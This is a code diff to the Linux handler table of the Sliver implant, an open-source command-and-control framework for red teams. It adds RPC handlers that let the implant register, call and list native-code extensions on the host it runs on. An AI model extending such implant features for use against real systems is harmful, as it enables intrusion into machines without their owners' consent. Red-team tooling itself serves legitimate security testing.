@@ -31,6 +31,7 @@ import (
 	"time"
 	"unsafe"
 
+	"github.com/bishopfox/sliver/implant/sliver/extension"
 	"github.com/bishopfox/sliver/implant/sliver/mount"
 	"github.com/bishopfox/sliver/implant/sliver/procdump"
 	"github.com/bishopfox/sliver/implant/sliver/taskrunner"
@@ -76,6 +77,11 @@ var (
 		sliverpb.MsgMountReq:       mountHandler,
 		sliverpb.MsgGrepReq:        grepHandler,
 
+		// Extensions
+		sliverpb.MsgRegisterExtensionReq: registerExtensionHandler,
+		sliverpb.MsgCallExtensionReq:     callExtensionHandler,
+		sliverpb.MsgListExtensionsReq:    listExtensionsHandler,
+
 		// Wasm Extensions - Note that execution can be done via a tunnel handler
 		sliverpb.MsgRegisterWasmExtensionReq:   registerWasmExtensionHandler,
 		sliverpb.MsgDeregisterWasmExtensionReq: deregisterWasmExtensionHandler,
@@ -105,6 +111,10 @@ var (
 // GetSystemHandlers - Returns a map of the linux system handlers
 func GetSystemHandlers() map[uint32]RPCHandler {
 	return linuxHandlers
+}
+
+func newExtension(data []byte, id string, arch string, init string) extension.Extension {
+	return extension.NewLinuxExtension(data, id, arch, init)
 }
 
 func dumpHandler(data []byte, resp RPCResponse) {
